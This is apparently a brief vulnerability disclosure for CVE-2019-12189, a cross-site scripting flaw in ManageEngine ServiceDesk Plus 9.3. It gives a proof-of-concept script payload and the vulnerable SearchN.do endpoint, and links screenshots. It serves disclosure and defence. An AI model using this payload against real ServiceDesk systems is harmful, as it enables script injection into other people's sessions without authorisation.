# CVE-2019-12189 - Zoho ManageEngine ServiceDesk Plus 9.3 XSS vulnerability 

Information
Description:XSS was discovered in ManageEngine ServiceDesk Plus version
Versions Affected: 9.3
Researcher: Dang The Tuyen

# Proof-of-concept
The vulnerability stems from the confusion of both single quotes and semicolon in the query string of the URL.

payload: ';alert('XSS');'
Attack vector: http://<domain>/SearchN.do

# Screenshot

![Alt text](https://github.com/falconz/CVE-2019-12189/blob/master/1.jpg?raw=true "Optional title")
![Alt text](https://github.com/falconz/CVE-2019-12189/blob/master/2.jpg?raw=true "Optional title")

